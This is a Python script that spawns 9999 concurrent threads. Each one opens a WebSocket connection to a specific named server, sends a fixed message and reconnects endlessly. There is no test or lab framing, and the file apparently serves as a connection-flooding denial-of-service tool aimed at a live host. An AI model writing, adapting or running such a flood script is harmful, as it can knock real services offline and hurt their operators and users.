import asyncio
import websockets  # type: ignore
import threading
from concurrent.futures import ThreadPoolExecutor

# Define the WebSocket server URL
WEBSOCKET_URL = "wss://x.mess.eu.org/haumea/"

# Function to handle a single WebSocket connection
async def send_message():
    while True:  # Infinite loop to keep reconnecting
        try:
            async with websockets.connect(WEBSOCKET_URL) as websocket:
                await websocket.send("Accept: MOTD")
                # Optionally, receive a response
                try:
                    response = await websocket.recv()
                    print(f"Received: {response}")
                except Exception as e:
                   pass
        except (websockets.exceptions.WebSocketException, asyncio.CancelledError) as e:
            print(f"Connection lost or failed: {e}")

# Function to run the WebSocket client in a separate thread
def run_client():
    asyncio.run(send_message())

# Number of connections you want to create
num_connections = 9999  # Change this number as needed

# Set up a ThreadPoolExecutor to handle multiple WebSocket clients
with ThreadPoolExecutor(max_workers=num_connections) as executor:
    for _ in range(num_connections):
        executor.submit(run_client)
